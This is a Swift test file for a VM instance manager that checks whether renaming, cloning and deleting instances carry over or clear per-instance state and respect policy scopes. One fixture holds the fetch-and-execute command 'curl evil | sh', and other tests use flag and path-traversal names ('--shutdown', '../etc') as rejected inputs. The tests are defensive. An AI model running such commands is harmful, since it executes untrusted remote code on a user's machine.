import XCTest
@testable import MSLCore

/// Renaming and cloning, and the one property that actually matters:
/// **nothing is left behind under the old name.**
///
/// The failure these exist for is not a crash. It is a store that nobody
/// remembered to add to the inventory, whose contents then stay attached to
/// a name nobody uses - until someone makes a new instance with that name
/// and inherits a stranger's disk policy, app overrides or camera
/// permission. MSL has had that bug from the other direction (a removed
/// instance's app list outliving it), which is why
/// `DaemonServer.removeInstanceState` carries a comment per store.
///
/// So the strong test here is not "did the registry move" - it is a sweep
/// of the whole directory afterwards looking for the old name anywhere.
final class InstanceStateTransferTests: XCTestCase {

    private var root: URL!

    override func setUp() {
        super.setUp()
        root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("msl-transfer-\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDown() {
        try? FileManager.default.removeItem(at: root)
        super.tearDown()
    }

    // MARK: - Building a machine with state everywhere

    /// Writes a plausible value for `instance` into every entry in the
    /// inventory, so a transfer has something to move in all of them.
    private func populate(_ instance: String) throws {
        func write(_ relative: String, _ object: Any) throws {
            let url = root.appendingPathComponent(relative)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(),
                                                   withIntermediateDirectories: true)
            try JSONSerialization.data(withJSONObject: object).write(to: url)
        }
        func touch(_ relative: String) throws {
            let url = root.appendingPathComponent(relative)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(),
                                                   withIntermediateDirectories: true)
            try Data("x".utf8).write(to: url)
        }

        try write("instances.json", [instance: "debian"])
        try write("storage.json", ["disks/\(instance).img": ["mode": "fixed", "size": 1, "autoGrow": false]])
        try write("appearance.json", [instance: ["badge": "blue"]])
        try write("locks.json", ["locked": [instance]])
        try write("peripherals.json", ["camera": [instance], "microphone": [instance]])
        try write("app-graphics.json", ["\(instance)\u{1F}/usr/bin/gimp": "software"])
        try write("app-commands.json", ["\(instance)\u{1F}/usr/bin/mari0": "love11 /opt/mari0"])
        try write("default-users.json", [instance: "abi"])
        try write("forwards.json", [["instance": instance, "hostPort": 8080,
                                     "guestPort": 3000, "route": "direct",
                                     "added": "2026-10-11T00:00:00Z"]])
        try touch("resources/\(instance).json")
        try touch("sandbox/\(instance).json")
        try touch("ssh/\(instance).json")
        try touch("disks/\(instance).img")
        try touch("disks/\(instance).Image")
        try touch("disks/\(instance).initramfs")
        try touch("experiments-\(instance).json")
        try touch("reopen-\(instance).json")
        try touch("vm-\(instance).machineid")
        try touch("identity/\(instance).json")
    }

    /// Every file under `root` whose name or contents mention `name`.
    private func mentions(of name: String) throws -> [String] {
        var found: [String] = []
        let enumerator = FileManager.default.enumerator(atPath: root.path)
        while let relative = enumerator?.nextObject() as? String {
            let url = root.appendingPathComponent(relative)
            guard (try? url.resourceValues(forKeys: [.isRegularFileKey]))?
                .isRegularFile == true else { continue }
            if relative.contains(name) {
                found.append("filename: \(relative)")
                continue
            }
            if let text = try? String(contentsOf: url, encoding: .utf8), text.contains(name) {
                found.append("contents: \(relative)")
            }
        }
        return found.sorted()
    }

    // MARK: - Rename

    func testARenameLeavesNothingUnderTheOldName() throws {
        try populate("oldname")
        try InstanceStateTransfer.apply(.move, from: "oldname", to: "newname", appSupport: root)

        // The property that matters. If this fails with a path in the
        // message, that store needs an entry in `InstanceStateTransfer
        // .inventory` - which is the whole reason this is a sweep and not
        // a list of individual assertions.
        XCTAssertEqual(try mentions(of: "oldname"), [],
                       "state left behind under the old name")
    }

    func testARenameCarriesEveryStoreOverToTheNewName() throws {
        try populate("oldname")
        let touched = try InstanceStateTransfer.apply(.move, from: "oldname", to: "newname",
                                                      appSupport: root)

        // Every TRANSFERRED entry reported as touched, so a shape that
        // silently matches nothing cannot pass the sweep above by moving no
        // data at all. The SSH record is excluded because it is cleared
        // rather than carried - see its inventory comment.
        XCTAssertEqual(Set(touched).count, touched.count, "an entry was reported twice")
        XCTAssertEqual(Set(touched),
                       Set(InstanceStateTransfer.inventory.filter(\.transferred).map(\.label)),
                       "some entries moved nothing")

        // And spot-check the awkward shapes, where the name is not the
        // whole key.
        let storage = try JSONSerialization.jsonObject(
            with: Data(contentsOf: root.appendingPathComponent("storage.json"))) as? [String: Any]
        XCTAssertNotNil(storage?["disks/newname.img"])
        let commands = try JSONSerialization.jsonObject(
            with: Data(contentsOf: root.appendingPathComponent("app-commands.json"))) as? [String: Any]
        XCTAssertEqual(commands?["newname\u{1F}/usr/bin/mari0"] as? String, "love11 /opt/mari0")
        let locks = try JSONSerialization.jsonObject(
            with: Data(contentsOf: root.appendingPathComponent("locks.json"))) as? [String: Any]
        XCTAssertEqual(locks?["locked"] as? [String], ["newname"])
    }

    func testARenameDoesNotDragAnInstanceWithASimilarNameAlongWithIt() throws {
        // `work` and `workshop`. A prefix match on the per-app keys without
        // the separator would take both, and the person renaming `work`
        // would silently lose `workshop`'s launch commands.
        try populate("work")
        let url = root.appendingPathComponent("app-commands.json")
        var commands = try JSONSerialization.jsonObject(with: Data(contentsOf: url)) as! [String: Any]
        commands["workshop\u{1F}/usr/bin/gimp"] = "gimp --verbose"
        try JSONSerialization.data(withJSONObject: commands).write(to: url)

        try InstanceStateTransfer.apply(.move, from: "work", to: "office", appSupport: root)

        let after = try JSONSerialization.jsonObject(with: Data(contentsOf: url)) as! [String: Any]
        XCTAssertEqual(after["workshop\u{1F}/usr/bin/gimp"] as? String, "gimp --verbose",
                       "renaming work took workshop's override with it")
        XCTAssertEqual(after["office\u{1F}/usr/bin/mari0"] as? String, "love11 /opt/mari0")
        XCTAssertNil(after["work\u{1F}/usr/bin/mari0"])
    }

    func testTheSSHRecordIsClearedRatherThanCarried() throws {
        // **A copied SSH record points the new instance at the OLD one.**
        // It holds the instance's IP, and the daemon's address resolver
        // trusts it before asking the guest - so a clone would have had its
        // forwards, `ssh -L` tunnels and PublicMSL publishes all land on
        // the original. A rename is equally wrong: the new name means a new
        // MAC and so a new DHCP lease, while the moved record still named
        // the old address.
        try populate("source")
        let sshDirectory = root.appendingPathComponent("ssh")
        try FileManager.default.createDirectory(at: sshDirectory, withIntermediateDirectories: true)
        try Data(#"{"host":"192.168.64.7","user":"abi","alias":"msl-source"}"#.utf8)
            .write(to: sshDirectory.appendingPathComponent("source.json"))

        try InstanceStateTransfer.apply(.copy, from: "source", to: "copy", appSupport: root)
        XCTAssertFalse(FileManager.default.fileExists(
            atPath: sshDirectory.appendingPathComponent("copy.json").path),
            "the clone inherited the original's address")
        // The original keeps its own, which is still correct for it.
        XCTAssertTrue(FileManager.default.fileExists(
            atPath: sshDirectory.appendingPathComponent("source.json").path))

        try InstanceStateTransfer.apply(.move, from: "source", to: "renamed", appSupport: root)
        for name in ["source.json", "renamed.json"] {
            XCTAssertFalse(FileManager.default.fileExists(
                atPath: sshDirectory.appendingPathComponent(name).path),
                "\(name) survived a rename")
        }
    }

    func testACloneDoesNotInheritTheMachineIdentifier() throws {
        // `VZGenericPlatformConfiguration.machineIdentifier` has to match
        // the saved state it restores. A clone starts cold, so sharing the
        // original's is a confusion with no upside - but a RENAME is the
        // same machine and keeps it.
        try populate("source")
        try InstanceStateTransfer.apply(.copy, from: "source", to: "copy", appSupport: root)
        XCTAssertFalse(FileManager.default.fileExists(
            atPath: root.appendingPathComponent("vm-copy.machineid").path))
        XCTAssertTrue(FileManager.default.fileExists(
            atPath: root.appendingPathComponent("vm-source.machineid").path))

        try InstanceStateTransfer.apply(.move, from: "source", to: "renamed", appSupport: root)
        XCTAssertTrue(FileManager.default.fileExists(
            atPath: root.appendingPathComponent("vm-renamed.machineid").path),
            "a rename lost the machine identifier, which saved state needs")
    }

    // MARK: - Clone

    func testACloneLeavesTheOriginalCompletelyIntact() throws {
        try populate("source")
        try InstanceStateTransfer.apply(.copy, from: "source", to: "copy", appSupport: root)

        // The original is the whole point: a clone that quietly moved
        // anything would be a rename with a misleading name.
        XCTAssertFalse(try mentions(of: "source").isEmpty, "the original lost its state")
        let registry = try JSONSerialization.jsonObject(
            with: Data(contentsOf: root.appendingPathComponent("instances.json"))) as? [String: Any]
        XCTAssertEqual(registry?["source"] as? String, "debian")
        XCTAssertEqual(registry?["copy"] as? String, "debian", "the clone is not registered")

        // Both instances hold the camera permission, rather than it moving.
        let peripherals = try JSONSerialization.jsonObject(
            with: Data(contentsOf: root.appendingPathComponent("peripherals.json"))) as? [String: Any]
        XCTAssertEqual((peripherals?["camera"] as? [String])?.sorted(), ["copy", "source"])

        // And the disk really exists as its own file.
        XCTAssertTrue(FileManager.default.fileExists(
            atPath: root.appendingPathComponent("disks/copy.img").path))
        XCTAssertTrue(FileManager.default.fileExists(
            atPath: root.appendingPathComponent("disks/source.img").path))
    }

    func testTransferringAnInstanceWithAlmostNoStateStillWorks() throws {
        // A registered instance that has never been started has one entry
        // and nothing else. Treating a missing store as a failure would
        // make this - the most ordinary case - impossible.
        try JSONSerialization.data(withJSONObject: ["bare": "alpine"])
            .write(to: root.appendingPathComponent("instances.json"))
        let touched = try InstanceStateTransfer.apply(.move, from: "bare", to: "renamed",
                                                      appSupport: root)
        XCTAssertEqual(touched, ["registry"])
        XCTAssertEqual(try mentions(of: "bare"), [])
    }
}

/// The preconditions, especially the one that makes renaming safe to offer
/// in a managed deployment at all.
final class InstanceRenameBlockerTests: XCTestCase {

    private func situation(exists: Bool = true, targetExists: Bool = false,
                           isRunning: Bool = false, isBusy: Bool = false,
                           hasSavedState: Bool = false, snapshots: [String] = [],
                           instanceCount: Int = 1,
                           policy: MSLAPPolicy? = nil) -> InstanceRename.Situation {
        InstanceRename.Situation(exists: exists, targetExists: targetExists,
                                 isRunning: isRunning, isBusy: isBusy,
                                 hasSavedState: hasSavedState, snapshots: snapshots,
                                 instanceCount: instanceCount, policy: policy)
    }

    private func policy(denying keys: [String], forScope match: String) -> MSLAPPolicy {
        MSLAPPolicy(issued: Date(), issuer: "Test",
                    scopes: [.init(match: match, deny: keys.map(MSLAPCapability.init),
                                   reason: "test")],
                    message: nil)
    }

    // MARK: - The escape route

    func testRenamingOutOfARestrictedScopeIsRefused() {
        // **The check this whole feature turns on.** MSLAP scopes match by
        // instance name, so without this, `lab-*` denied `instance.delete`
        // is undone in one command by renaming `lab-3` to `mine` - and a
        // policy is only ever as strong as the names it happens to mention.
        let p = policy(denying: ["instance.delete"], forScope: "lab-*")
        let blocker = InstanceRename.renameBlocker(from: "lab-3", to: "mine",
                                                   situation: situation(policy: p))
        guard case .escapesPolicy(let capability, _, _) = blocker else {
            return XCTFail("renaming out of a restricted scope was allowed: \(String(describing: blocker))")
        }
        XCTAssertEqual(capability, "instance.delete")
        XCTAssertTrue("\(blocker!)".contains("way around"), "\(blocker!)")
    }

    func testCloningOutOfARestrictedScopeIsRefused() {
        // Worse than a rename, if anything: the restricted instance stays
        // put and an unrestricted copy of its disk appears beside it.
        let p = policy(denying: ["shipment.export"], forScope: "lab-*")
        guard case .escapesPolicy = InstanceRename.cloneBlocker(
            from: "lab-3", to: "mine", situation: situation(policy: p)) else {
            return XCTFail("cloning out of a restricted scope was allowed")
        }
    }

    func testMovingIntoAMoreRestrictedNameIsAllowed() {
        // One-directional, by the same rule as the rest of MSLAP: an
        // operation that reduces what can be done is never refused.
        let p = policy(denying: ["instance.delete"], forScope: "lab-*")
        XCTAssertNil(InstanceRename.renameBlocker(from: "mine", to: "lab-9",
                                                  situation: situation(policy: p)))
    }

    func testAnUnmanagedMacHasNoEscapesToFind() {
        XCTAssertEqual(InstanceRename.policyEscapes(from: "a", to: "b", policy: nil), [])
        XCTAssertNil(InstanceRename.renameBlocker(from: "a", to: "b", situation: situation()))
    }

    func testEveryDeniedCapabilityIsCheckedNotAShortlist() {
        // The one that matters is whichever the administrator wrote, so the
        // comparison is over the whole catalogue. A policy denying a
        // capability nobody thought to list must still block the escape.
        let p = policy(denying: ["peripherals.microphone"], forScope: "quiet")
        XCTAssertEqual(InstanceRename.policyEscapes(from: "quiet", to: "loud", policy: p),
                       ["peripherals.microphone"])
    }

    // MARK: - The ordinary preconditions

    func testSavedMemoryBlocksARenameAndSaysWhy() {
        // The MAC address is derived from the instance name, and macOS
        // refuses to restore a saved VM whose address changed - with
        // `VZErrorDomain Code=12 "invalid argument"`, which explains
        // nothing. Refusing up front, with instructions, beats that.
        let blocker = InstanceRename.renameBlocker(
            from: "work", to: "office", situation: situation(hasSavedState: true))
        guard case .savedState = blocker else {
            return XCTFail("a hibernated instance was renamed: \(String(describing: blocker))")
        }
        XCTAssertTrue("\(blocker!)".contains("Start work once"), "\(blocker!)")
    }

    func testSnapshotsBlockARenameAndAreNamed() {
        let blocker = InstanceRename.renameBlocker(
            from: "work", to: "office", situation: situation(snapshots: ["before-upgrade"]))
        XCTAssertTrue("\(blocker!)".contains("before-upgrade"), "\(blocker!)")
    }

    func testSavedMemoryDoesNotBlockAClone() {
        // The original keeps its name, and so its address; the copy starts
        // cold. Only MOVING a name invalidates saved state.
        XCTAssertNil(InstanceRename.cloneBlocker(from: "work", to: "copy",
                                                 situation: situation(hasSavedState: true,
                                                                      snapshots: ["s"])))
    }

    func testARunningInstanceIsRefusedForBoth() {
        // Cloning a live ext4 image captures it mid-write - the same
        // corruption two instances sharing one image used to cause.
        for blocker in [InstanceRename.renameBlocker(from: "a", to: "b",
                                                     situation: situation(isRunning: true)),
                        InstanceRename.cloneBlocker(from: "a", to: "b",
                                                    situation: situation(isRunning: true))] {
            guard case .running = blocker else { return XCTFail("\(String(describing: blocker))") }
        }
    }

    func testTheUsualNameRulesApply() {
        guard case .invalidName = InstanceRename.renameBlocker(
            from: "a", to: "--shutdown", situation: situation()) else {
            return XCTFail("a flag was accepted as an instance name")
        }
        guard case .alreadyExists = InstanceRename.renameBlocker(
            from: "a", to: "b", situation: situation(targetExists: true)) else {
            return XCTFail("an existing name was accepted")
        }
        guard case .sameName = InstanceRename.renameBlocker(
            from: "a", to: "a", situation: situation()) else {
            return XCTFail("renaming to the same name was accepted")
        }
        guard case .noSuchInstance = InstanceRename.renameBlocker(
            from: "ghost", to: "b", situation: situation(exists: false)) else {
            return XCTFail("a missing instance was accepted")
        }
    }

    func testACloneCountsAgainstTheInstanceCeiling() {
        // A deployment that caps how many instances exist means that cap
        // however they are made.
        guard case .atCapacity = InstanceRename.cloneBlocker(
            from: "a", to: "b",
            situation: situation(instanceCount: InstanceRegistry.maxInstances)) else {
            return XCTFail("a clone slipped past the instance limit")
        }
        // A rename does not: the count does not change.
        XCTAssertNil(InstanceRename.renameBlocker(
            from: "a", to: "b",
            situation: situation(instanceCount: InstanceRegistry.maxInstances)))
    }

    // MARK: - The daemon mapping

    func testBothAskForTheRightCapabilities() {
        XCTAssertEqual(MSLAPEnforcement.requirements(
            for: .renameInstance(instance: "work", newName: "office")).map(\.capability.key),
            ["instance.rename"])
        // A clone creates an instance, so it answers to both.
        XCTAssertEqual(Set(MSLAPEnforcement.requirements(
            for: .cloneInstance(instance: "work", newName: "copy")).map(\.capability.key)),
            ["instance.clone", "instance.create"])
    }

    func testBothRequestsSurviveTheWire() {
        // `ControlRequest` is not Equatable, so the round trip is checked by
        // re-encoding what came back - which proves the same thing and
        // fails just as loudly on a mismatch.
        for request in [DaemonProtocol.ControlRequest.renameInstance(instance: "work", newName: "office"),
                        .cloneInstance(instance: "work", newName: "copy")] {
            let line = String(decoding: request.encode(), as: UTF8.self)
                .trimmingCharacters(in: .whitespacesAndNewlines)
            guard let parsed = DaemonProtocol.ControlRequest.parse(line) else {
                return XCTFail("did not parse: \(line)")
            }
            XCTAssertEqual(String(decoding: parsed.encode(), as: UTF8.self), 
                           String(decoding: request.encode(), as: UTF8.self))
        }
    }

    func testAnUnusableNameFailsToParseRatherThanReachingTheHandler() {
        // These names become file and directory components in a dozen
        // places, so a request that cannot be carried out must not decode
        // into one that looks like it can.
        XCTAssertNil(DaemonProtocol.ControlRequest.parse("RENAME work --shutdown"))
        XCTAssertNil(DaemonProtocol.ControlRequest.parse("CLONE ../etc copy"))
        XCTAssertNil(DaemonProtocol.ControlRequest.parse("RENAME work"))
    }
}

/// Removing an instance, and the leak that was live until the inventory
/// existed.
final class InstanceStateForgetTests: XCTestCase {
    private var root: URL!

    override func setUp() {
        super.setUp()
        root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("msl-forget-\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDown() {
        try? FileManager.default.removeItem(at: root)
        super.tearDown()
    }

    private func write(_ relative: String, _ object: Any) throws {
        let url = root.appendingPathComponent(relative)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(),
                                               withIntermediateDirectories: true)
        try JSONSerialization.data(withJSONObject: object).write(to: url)
    }

    private func read(_ relative: String) throws -> [String: Any] {
        try JSONSerialization.jsonObject(
            with: Data(contentsOf: root.appendingPathComponent(relative))) as? [String: Any] ?? [:]
    }

    func testADeletedInstanceLeavesNoLaunchCommandBehind() throws {
        // **The one that mattered.** A launch override runs an arbitrary
        // command in the guest, which is why `apps.customCommand` exists
        // and why `AppCustomCommandStore.set` is gated. A command left by a
        // deleted instance needed nobody to write it, so a new instance
        // reusing the name ran it with the gate never consulted.
        try write("app-commands.json", ["gone\u{1F}/usr/bin/x": "curl evil | sh",
                                        "stays\u{1F}/usr/bin/y": "gimp"])
        InstanceStateTransfer.forget(instance: "gone", appSupport: root)

        let after = try read("app-commands.json")
        XCTAssertNil(after["gone\u{1F}/usr/bin/x"], "a deleted instance's launch command survived")
        XCTAssertEqual(after["stays\u{1F}/usr/bin/y"] as? String, "gimp",
                       "forgetting one instance took another's override")
    }

    func testTheOtherFourThatWereLeaking() throws {
        try write("locks.json", ["locked": ["gone", "stays"]])
        try write("peripherals.json", ["camera": ["gone"], "microphone": ["gone", "stays"]])
        try write("app-graphics.json", ["gone\u{1F}/usr/bin/x": "software"])
        try write("appearance.json", ["gone": ["badge": "red"], "stays": ["badge": "blue"]])
        let sandbox = root.appendingPathComponent("sandbox/gone.json")
        try FileManager.default.createDirectory(at: sandbox.deletingLastPathComponent(),
                                                withIntermediateDirectories: true)
        try Data("{}".utf8).write(to: sandbox)

        InstanceStateTransfer.forget(instance: "gone", appSupport: root)

        XCTAssertEqual(try read("locks.json")["locked"] as? [String], ["stays"])
        XCTAssertEqual(try read("peripherals.json")["camera"] as? [String], [])
        XCTAssertEqual(try read("peripherals.json")["microphone"] as? [String], ["stays"])
        XCTAssertTrue(try read("app-graphics.json").isEmpty)
        XCTAssertNil(try read("appearance.json")["gone"])
        XCTAssertNotNil(try read("appearance.json")["stays"])
        XCTAssertFalse(FileManager.default.fileExists(atPath: sandbox.path))
    }

    func testForgettingNeverTouchesTheDiskOrTheRegistry() throws {
        // `msl remove --keep-disk` depends on this: the disk and the
        // registry entry belong to `InstanceDisk.remove` and
        // `registry.remove`, and clearing them here would make the flag a
        // lie.
        try write("instances.json", ["gone": "alpine"])
        let disk = root.appendingPathComponent("disks/gone.img")
        try FileManager.default.createDirectory(at: disk.deletingLastPathComponent(),
                                                withIntermediateDirectories: true)
        try Data("disk".utf8).write(to: disk)

        InstanceStateTransfer.forget(instance: "gone", appSupport: root)

        XCTAssertTrue(FileManager.default.fileExists(atPath: disk.path),
                      "forget deleted the disk, which --keep-disk relies on keeping")
        XCTAssertNotNil(try read("instances.json")["gone"])
    }

    func testTheInventoryAgreesWithItselfAboutWhatForgetCovers() throws {
        // Exactly four entries are somebody else's to clear. If a fifth
        // appears, it is either a mistake or needs this list updating.
        let kept = InstanceStateTransfer.inventory
            .filter { !$0.clearedOnRemoval }.map(\.label)
        XCTAssertEqual(Set(kept), ["registry", "instance disk", "shipped kernel",
                                   "shipped initramfs"])
    }
}
